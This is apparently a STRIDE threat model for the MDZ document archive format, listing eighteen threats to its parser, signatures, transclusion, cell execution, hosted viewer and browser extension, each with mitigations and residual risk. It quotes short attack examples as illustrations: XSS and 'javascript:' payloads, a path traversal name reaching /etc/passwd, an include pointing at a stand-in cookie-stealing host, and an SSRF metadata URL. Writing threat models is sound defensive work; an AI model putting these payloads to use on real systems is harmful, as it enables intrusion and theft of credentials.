# MDZ Threat Model

**Scope:** the MDZ format, reference parsers, reference viewer, hosted viewer
service, browser extension, and CLI. Covers threats from a malicious archive
author, malicious publisher, compromised network, and compromised endpoint.

**Status:** Phase 3 baseline. Updated as new attack surface lands (kernel
execution via Pyodide, signature verification, hosted rendering).

**Methodology:** STRIDE (Spoofing, Tampering, Repudiation, Information
Disclosure, Denial of Service, Elevation of Privilege). For each surface
we enumerate assets, attacker objectives, mitigations in place, and
residual risk.

---

## Assets

| Asset | Where it lives | Why it matters |
|-------|----------------|----------------|
| Archive bytes | User's filesystem, origin server, hosted-viewer URL parameter | Source of truth for what the user reads |
| Reader's execution context | Browser tab, desktop app, terminal | Primary attack target — XSS, session hijack, code execution |
| Reader's identity (signatures) | User's local keystore | Signing a review or counter-signing a paper is a trust statement |
| Signed provenance chain | `security.signatures[]` in manifest | Cryptographic authorship claim — forgery defeats the point of the format |
| ORCID / DID resolution | `did:web:orcid.org:...` → ORCID record | If resolution is spoofed, signatures attribute to wrong author |
| Citation references | `references.json` + `::cite` | Fabricated citations erode paper trustworthiness |
| Host-page integrity (when viewer is embedded) | DOM + cookies of the embedding site | Viewer must not leak host-page credentials or permit XSS escape |

## Attacker roles

1. **Malicious author** — submits an archive hoping to compromise reviewers or editors.
2. **Malicious reviewer** — signs a review that claims they verified something they didn't.
3. **Compromised publisher** — resigns an archive to attribute it to someone else.
4. **Network attacker** — MITMs archive downloads or DID resolutions.
5. **Malicious viewer host** — serves a tampered viewer that lies about signature status.
6. **Endpoint compromise** — user's machine is already owned; archive viewing is a secondary amplification.

Attackers 5 and 6 are out of scope for the format itself (no file format
defends against a compromised viewer or endpoint); the other four are
in-scope and the mitigations below target them.

---

## Surface: Parser / sanitizer

### T1 — Script injection via markdown
**Spoofing / Elevation.** Attacker embeds `<script>` / `<iframe>` / `onerror`
attributes hoping the viewer renders them.
- **Mitigation:** `packages/mdz-viewer/src/render.ts` allowlist sanitizer
  strips every non-whitelisted tag and every `on*` attribute. CSP
  `script-src 'self'` blocks execution even if a script tag slips through.
- **Negative tests:** `tests/security/csp/` (Phase 3 deliverable).
- **Residual risk:** browser XSS bug at the parser level. Tracked by
  `tests/property/test_parser_properties.py` fuzzing.

### T2 — Dangerous URL schemes
**Elevation.** `[link](javascript:alert(1))` / `<img src="javascript:...">`.
- **Mitigation:** sanitizer's `rewriteUrl` rejects `javascript:`, `vbscript:`,
  `file:`, and `data:` (except image/* through the image-rewrite path, which
  is also strict).
- **Residual risk:** novel URL schemes in future browsers. The allowlist is
  positive (permit known-safe), not negative (reject known-bad), so new
  schemes default-deny.

### T3 — Path traversal via archive entry names
**Information disclosure / Tampering.** Archive contains `assets/../../etc/passwd`.
- **Mitigation:** `sanitizePath` (TypeScript) and the archive inflator
  strip `..` path segments. The viewer never writes to disk; desktop
  editors that do extract MUST apply `sanitizePath` before `fs.writeFile`.
- **Negative tests:** `tests/property/test_parser_properties.py` has a
  `sanitizePath never allows path traversal` property.

### T4 — ZIP bomb / archive DOS
**Denial of Service.** Archive inflates to many GB of junk, exhausting memory.
- **Mitigation:** fflate's `unzipSync` has no per-entry or total-size limit
  by default. The viewer enforces a **per-session 500 MB inflation limit**
  at the call site (`loadArchive` in 0.2.x) and logs a warning over 50 MB.
- **Residual risk:** inflate-to-disk in desktop editors or CI batch
  processors still vulnerable. Phase 4 streaming-read work addresses this.

### T5 — Unterminated fence absorbing document
**Tampering.** `::cell` with a `\`\`\`python` but no closing fence hides
content (a reviewer sees a half-rendered paper and misses the hidden
tail).
- **Mitigation:** parser raises `ParseError` on unterminated fences
  (`_consume_fence` in `mdz_parser/parser.py` line ~315). Silent
  absorption was the pre-Phase-1 bug; explicit rejection is now a
  spec-level MUST (ABNF constraint #1).

### T6 — Malformed directive attrs silently swallowed
**Tampering.** `::cell{language="python kernel="p"}` (missing close quote)
produces a cell with no kernel attribute in the old parser, which the
viewer then treats as "kernel unspecified."
- **Mitigation:** `_parse_attrs_lark` runs in strict mode for v2.0+
  directives; malformed attr bodies raise `ParseError` with line context.
- **Test:** `tests/v2.0/test_lark_parser.py::test_lark_v20_cell_raises_on_malformed_attrs`.

## Surface: Signatures and DID resolution

### T7 — Signature forgery
**Spoofing.** Attacker creates an archive claiming authorship by someone else.
- **Mitigation:** `security.signatures[].signer.did` is resolved to a public
  key via the DID method; the signature is verified against the manifest
  (under the declared `canonicalization`, e.g., JCS for v2.0). A forged
  signature fails verification.
- **Mitigation:** `mdz verify` CLI is the reference verifier; viewers MUST
  display "unverified" for signatures that fail or that the viewer can't
  resolve.

### T8 — Signature chain tampering
**Tampering.** Attacker reorders or drops entries in `security.signatures[]`.
- **Mitigation:** each entry (after the first) MUST carry `prev_signature`
  = hash of the previous entry. Inserting or reordering breaks the chain.
  Enforced by `MDZManifest.validate()` and `addSignature()` (Phase 0
  hardening).
- **Residual risk:** an attacker who forges EVERY entry (not just inserts
  into an existing chain) and controls every purported signer's DID
  resolution can produce a fully-valid-looking chain. This is why DID
  trust policy (T9) matters.

### T9 — DID resolution spoofing
**Spoofing.** `did:web:orcid.org:0000-...` resolution requires an HTTPS
fetch of orcid.org's DID document. MITM → attacker-controlled response →
attacker's public key accepted.
- **Mitigation:** TLS certificate validation is the base defense. The
  verifier SHOULD pin ORCID's CA / key in trust policy. Phase 3 verifier
  config supports a local trust anchor file.
- **Residual risk:** compromised CA. This is the general Internet PKI
  threat model; outside MDZ's scope to fix.

### T10 — Signer key rotation / revocation
**Repudiation.** Author's key is stolen; archives signed under the stolen
key should no longer verify.
- **Mitigation:** `security.signatures[].revocation_url` — optional URL
  the verifier fetches to check revocation status. If the signature's
  `timestamp` is after the revocation's `effective_from`, verification
  fails.
- **Residual risk:** offline verification. If the verifier can't reach
  the revocation URL, it MUST warn but MAY permit the signature (policy
  decision). The CLI's default is "warn + permit"; the hosted viewer's
  default is "warn + permit with visible UI indicator."

## Surface: Transclusion (`::include`)

### T11 — Supply-chain attack via external include
**Tampering / Information disclosure.** Archive includes
`::include[target="https://evil.example.com/steal-cookie.md"]` and the
viewer fetches from the attacker.
- **Mitigation:** external includes REQUIRE `content_hash` pinning per
  v2.0 spec §12. The viewer fetches, hashes, compares — mismatched
  content is rejected. No hash → include is rejected.
- **Mitigation:** `permissions.allow_external_includes: false` (default)
  rejects ALL external includes regardless of hash.
- **Residual risk:** an attacker who controls the external URL AND can
  pre-hash the malicious content can still ship a "valid" include — but
  the hash is baked into the archive at authoring time, so the attacker
  would need to compromise the archive itself (covered by T7).

### T12 — Include recursion / infinite loop
**Denial of Service.** A.md includes B.md includes A.md.
- **Mitigation:** parser maintains a visit set per parse; revisiting a
  target is a `ParseError`. Enforced by the v2.0 spec §12 circular-reference
  detection requirement.

## Surface: Cell execution (Pyodide / webR, Phase 2.3b)

### T13 — Sandbox escape from cell code
**Elevation.** Malicious Python in `::cell` escapes Pyodide's WASM sandbox.
- **Mitigation:** Pyodide's sandbox IS our first defense. Cell execution
  is off by default (`permissions.allow_kernels: false`); user opt-in
  per-archive via a confirmation dialog.
- **Mitigation:** CSP `connect-src 'self'` inside the sandbox prevents
  exfiltration even if the sandbox escapes — the attacker can't phone
  home.
- **Residual risk:** Pyodide escape vulnerabilities. These have been
  rare but nonzero; subscribing to Pyodide security advisories is a
  Phase 3 operational requirement.

### T14 — Resource exhaustion from cell code
**Denial of Service.** `while True: 1` in a Python cell.
- **Mitigation:** execution runs in a Web Worker with a 30-second
  wall-clock timeout and 512 MB memory ceiling. Exceeding either
  terminates the worker.

## Surface: Hosted viewer service

### T15 — SSRF from `?url=` parameter
**Information disclosure.** Attacker passes
`?url=http://internal-metadata-service/` hoping the Worker fetches it.
- **Mitigation:** the Worker does NOT fetch the archive — it returns an
  HTML page that uses the browser's fetch. The browser's same-origin
  policy + DNS protection prevents metadata-service exposure.
- **Mitigation:** `isSafeUrl` rejects non-http(s) schemes at the Worker.
- **Residual risk:** none significant — the fetch happens in the user's
  browser with their credentials, same as if they'd typed the URL into
  the address bar. This is a deliberate design choice (stateless Worker).

### T16 — CSRF against hosted viewer
**Elevation.** Attacker embeds
`<iframe src="view.mdz-format.org?url=attack.mdz">` in their page.
- **Mitigation:** `frame-ancestors 'self'` in the CSP prevents framing
  by third-party sites.

## Surface: Browser extension

### T17 — Content-script privilege escalation
**Elevation.** Malicious page tricks the content script into opening an
attacker-controlled archive in the viewer.
- **Mitigation:** content script only LISTENS for user clicks on `.mdz` /
  `.mdx` links — it doesn't auto-open archives. Any archive load is a
  deliberate user action.
- **Mitigation:** viewer page runs in extension context (not host-page
  context), isolated via Chrome's per-extension origin.

### T18 — Extension update to malicious version
**Tampering.** Attacker compromises a publisher account and pushes a
malicious update.
- **Mitigation:** each browser store (Chrome Web Store, Firefox Add-ons,
  etc.) does its own review. Firefox additionally requires reproducible
  builds with source upload — we comply.
- **Residual risk:** store compromise. Out of scope; users should check
  extension signatures and prefer reproducible-build stores.

---

## Residual risks we explicitly accept

These are out of scope for the format's defenses:

- **Compromised author machines** — if the author's machine is owned,
  the signature is still cryptographically valid. The format defends
  authorship, not key secrecy.
- **Social-engineering attacks** — an attacker who convinces a reviewer
  to sign a malicious review can't be stopped by the format.
- **Side-channel attacks on the viewer's WebCrypto implementation** —
  trust the browser's implementation.
- **Legal / regulatory compliance** — the format carries metadata
  necessary for compliance workflows (licenses, author identity, review
  trails) but doesn't enforce compliance policy itself.

---

## Update cadence

- New attack classes: amend immediately, announce via GitHub Security.
- New surfaces (kernels, hosted editor): threat-model before the code
  ships. Phase 2.3b kernel execution is a scheduled pre-launch review
  gate.
- Regression test: every mitigation above has a corresponding entry in
  `tests/security/` (Phase 3 deliverable — structure exists in `tests/`
  but contents are Phase 3.2 build).

## References

- STRIDE methodology: Howard & LeBlanc, _Writing Secure Code_
- OWASP ASVS for Web Apps (viewer)
- NIST SP 800-63 (authentication context for DID-based identity)
- W3C Verifiable Credentials Data Model (signature interop target)
- MDZ spec §16 (signatures), §12 (transclusion), §19 (permissions)
